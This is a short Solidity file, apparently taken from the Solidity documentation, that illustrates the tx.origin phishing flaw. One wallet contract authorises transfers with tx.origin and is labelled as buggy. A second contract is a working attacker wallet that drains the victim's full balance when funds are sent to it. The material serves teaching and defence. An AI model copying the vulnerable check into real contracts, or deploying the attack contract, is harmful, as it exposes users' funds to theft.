// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

// From https://docs.soliditylang.org/en/latest/security-considerations.html?#tx-origin
// THIS CONTRACT CONTAINS A BUG - DO NOT USE
contract TxUserWallet {
	address owner;

	constructor() {
		owner = msg.sender;
	}

	function transferTo(address payable dest, uint256 amount) public {
		// THE BUG IS RIGHT HERE, you must use msg.sender instead of tx.origin
		require(tx.origin == owner);
		dest.transfer(amount);
	}
}

contract TxAttackWallet {
	address payable owner;

	constructor() {
		owner = payable(msg.sender);
	}

	receive() external payable {
		TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
	}
}
